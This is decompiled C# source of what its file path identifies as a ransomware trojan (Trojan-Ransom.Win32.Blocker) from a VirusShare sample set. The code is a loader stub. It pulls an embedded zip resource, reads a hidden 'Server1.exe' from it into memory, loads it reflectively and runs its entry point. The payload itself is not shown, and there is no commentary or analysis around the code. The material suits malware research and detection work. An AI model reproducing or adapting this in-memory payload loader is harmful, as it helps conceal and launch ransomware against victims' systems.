// Decompiled with JetBrains decompiler
// Type: R.P
// Assembly: Server1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D8C0A5FC-E868-4F73-80C5-9ABDC9B2F95A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bycv-25affc6a4de4f5eeba716c0383446dc1d846dbb39089a4677785a43c435074fb.exe

using System;
using System.IO;
using System.IO.Packaging;
using System.Reflection;
using System.Windows.Forms;

namespace R
{
  internal static class P
  {
    private static Assembly L(Package p, string u)
    {
      Uri partUri = new Uri(u, UriKind.Relative);
      byte[] numArray;
      using (Stream stream = p.GetPart(partUri).GetStream())
      {
        numArray = new byte[(int) stream.Length];
        stream.Read(numArray, 0, numArray.Length);
      }
      Assembly assembly = Assembly.Load(numArray);
      return !((Assembly) null == assembly) ? assembly : throw new ArgumentException("Unable to load assembly: " + u);
    }

    [STAThread]
    private static void Main(string[] args)
    {
      try
      {
        using (Stream manifestResourceStream = typeof (P).Assembly.GetManifestResourceStream("a.zip"))
        {
          using (Package p = Package.Open(manifestResourceStream, FileMode.Open, FileAccess.Read))
            P.L(p, "/Server1.exe").EntryPoint.Invoke((object) null, new object[1]
            {
              (object) args
            });
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.GetType().Name + Environment.NewLine + ex.Message + Environment.NewLine + ex.StackTrace);
      }
    }
  }
}
